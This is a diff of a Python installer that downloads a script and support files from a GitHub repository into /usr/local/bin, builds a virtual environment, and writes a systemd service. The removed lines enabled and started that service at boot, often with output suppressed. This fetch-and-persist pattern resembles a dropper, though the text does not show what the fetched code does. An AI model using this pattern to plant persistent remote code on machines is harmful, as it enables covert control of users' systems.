@@ -13,6 +13,11 @@ requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/
 contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/mechanism"
 
 
+# Define URLs for downloading the necessary files
+repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection.py"
+requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
+contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/mechanism"
+
 # Define the output file paths
 envPath = "/usr/local/bin/protectionEnv"
 pythonPath = "/usr/local/bin/protectionEnv/bin/python3"
@@ -21,67 +26,90 @@ requirementsFilePath = "/usr/local/bin/requirements.txt"
 contentFilePath = "/usr/local/bin/mechanism"
 serviceFilePath = "/etc/systemd/system/protection.service"
 
-def install_pip_and_requests():
-    try:
-        # Check if pip is already installed
-        try:
-            subprocess.run([sys.executable, '-m', 'pip', '--version'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        except subprocess.CalledProcessError:
-            # If pip is not installed, install pip
-            subprocess.run([sys.executable, '-m', 'ensurepip', '--upgrade'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-        # Install 'requests' using pip
-        subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-        return True
-    except subprocess.CalledProcessError:
-        return False
-    except Exception:
-        return False
-
-
 # Function to create a virtual environment and install requests
-def create_virtual_environment(env_path):
+def create_virtual_environment(envPath):
     try:
         # Create the virtual environment
-        subprocess.run([sys.executable, '-m', 'venv', env_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run([sys.executable, '-m', 'venv', envPath], check=True)
+        print(f"[!] Virtual environment created at:\t{envPath}")
+
+        # Determine pip path
+        pip_executable = os.path.join(envPath, 'Scripts', 'pip') if os.name == 'nt' else os.path.join(envPath, 'bin', 'pip')
 
         # Install 'requests' in the virtual environment
-        pip_executable = os.path.join(env_path, 'bin', 'pip')
-        subprocess.run([pip_executable, 'install', 'requests'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run([pip_executable, 'install', 'requests'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+        print(f"[!] requests installed on virtual environment at:\t{envPath}")
 
         return True
-    except subprocess.CalledProcessError:
+    except subprocess.CalledProcessError as e:
+        print(f"Error creating virtual environment: {e}")
         return False
-    except Exception:
+    except Exception as e:
+        print(f"Unexpected error: {e}")
         return False
 
-
-# Function to use an existing virtual and install requirements
-def setup_python_environment(env_path, requirements_path):
+# Function to install requirements into an existing virtual environment
+def setup_python_environment(envPath, requirements_path):
     try:
-        # Check if the requirements file exists
         if not os.path.exists(requirements_path):
+            print("Requirements file not found.")
             return None
 
+        # Determine pip path
+        pip_executable = os.path.join(envPath, 'Scripts', 'pip') if os.name == 'nt' else os.path.join(envPath, 'bin', 'pip')
+
         # Install requirements
-        pip_executable = os.path.join(env_path, 'Scripts', 'pip') if os.name == 'nt' else os.path.join(env_path, 'bin', 'pip')
-        subprocess.run([pip_executable, 'install', '-r', requirements_path], capture_output=False, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run([pip_executable, 'install', '-r', requirements_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+        print(f"[!] requirements.txt installed on virtual environment at:\t{envPath}")
 
-        return pip_executable  # Return pip path for service configuration if needed
+        return pip_executable  # Return pip path if needed
 
-    except Exception:
+    except subprocess.CalledProcessError as e:
+        print(f"Error installing dependencies: {e}")
         return None
+    except Exception as e:
+        print(f"Unexpected error: {e}")
+        return None
+
+# Function to activate a virtual environment dynamically
+def activate_virtual_environment(envPath):
+    bin_path = os.path.join(envPath, 'Scripts') if os.name == 'nt' else os.path.join(envPath, 'bin')
+    lib_path = os.path.join(envPath, 'lib', f'python{sys.version_info.major}.{sys.version_info.minor}', 'site-packages')
+
+    if not os.path.exists(bin_path) or not os.path.exists(lib_path):
+        print("Invalid virtual environment path.")
+        return False
+
+    sys.path.insert(0, lib_path)  # Add site-packages to sys.path
+    os.environ['VIRTUAL_ENV'] = envPath
+    os.environ['PATH'] = f"{bin_path}{os.pathsep}{os.environ['PATH']}"
+    sys.prefix = envPath  # Update sys.prefix to reflect the virtual environment
+
+    return True
+
+# Step 1: Setup virtual environment
+#if not os.path.exists(envPath):
+create_virtual_environment(envPath)
+
+success = activate_virtual_environment(envPath)
+
+# Ensure environment is active
+if success:
+    try:
+        pip_path = setup_python_environment(envPath, requirementsFilePath)
+    except ImportError as e:
+        print(f"ImportError: {e}")
 
 # Function to download a file and save it locally
 def download_file(url, file_path):
-    import requests
     try:
+        import requests
         response = requests.get(url)
         response.raise_for_status()
         with open(file_path, 'wb') as file:
             file.write(response.content)
     except requests.exceptions.RequestException as e:
+        print(f"Download failed: {e}")
         pass
 
 
@@ -140,60 +168,37 @@ def make_executable(file_path):
 
 if __name__ == "__main__":
 
-    # Download requests from pip first
-    #import requests
-
-    # Step 1: Setup virtual environment
-    if not os.path.exists(envPath):
-        print(f"Virtual environment does not exist. Creating it at {envPath}...")
-        create_virtual_environment(envPath)
-    else:
-        print(f"Virtual environment already exists at {envPath}. Using existing environment.")
-        pass
-
-    # Ensure environment is active
-    virtual_env_python = os.path.join(envPath, 'bin', 'python3')
-    if sys.prefix != envPath:
-        print(f"sys.prefix: {sys.prefix}")
-        print(f"sys.executable: {sys.executable}")
-
-        # Re-run the script using the virtual environment's Python
-        virtual_env_python = "/usr/local/bin/protectionEnv/bin/python3"
-        if os.path.exists(virtual_env_python):
-            subprocess.run([virtual_env_python] + sys.argv)
-            print(f"[!] Virtual environment changed to {virtual_env_python}")
-
-            #import requests
-        else:
-            print("[!] Virtual python script doesn't exist!")
-            sys.exit(1)
-
 
     # Download the files
     download_file(repoUrl, repoFilePath)
     download_file(requirementsUrl, requirementsFilePath)
     download_file(contentUrl, contentFilePath)
 
+    time.sleep(10)
+
 
     # Make the main script executable
     make_executable(repoFilePath)
-
-    # Create the environment and install requirements
-    pip_path = setup_python_environment(envPath, requirementsFilePath)
 
     # Create the service file if on Linux
     if pip_path and os.name != 'nt':  # Skip service creation on Windows
         python_executable = os.path.join(envPath, 'bin', 'python3')
         create_service_file(serviceFilePath, pythonPath)
 
-    # Reload systemd to recognize the new service
-    subprocess.run(['systemctl', 'daemon-reload'], check=True)
+    sys.exit(0)
 
-    # Enable the service to run at boot
-    subprocess.run(['systemctl', 'enable', 'protection.service'], check=True)
-
-    # Start the service immediately
-    subprocess.run(['systemctl', 'start', 'protection.service'], check=True)
+#    try:
+#        # Reload systemd to recognize the new service
+#        subprocess.run(['systemctl', 'daemon-reload'], check=True)
+#
+#        # Enable the service to run at boot
+#        subprocess.run(['systemctl', 'enable', 'protection.service'], check=True)
+#
+#        # Start the service immediately
+#        subprocess.run(['systemctl', 'start', 'protection.service'], check=True)
+#
+#    except Exception as e:
+#        pass
 
     # Get the full path of the script
     script_path = os.path.abspath(__file__)  
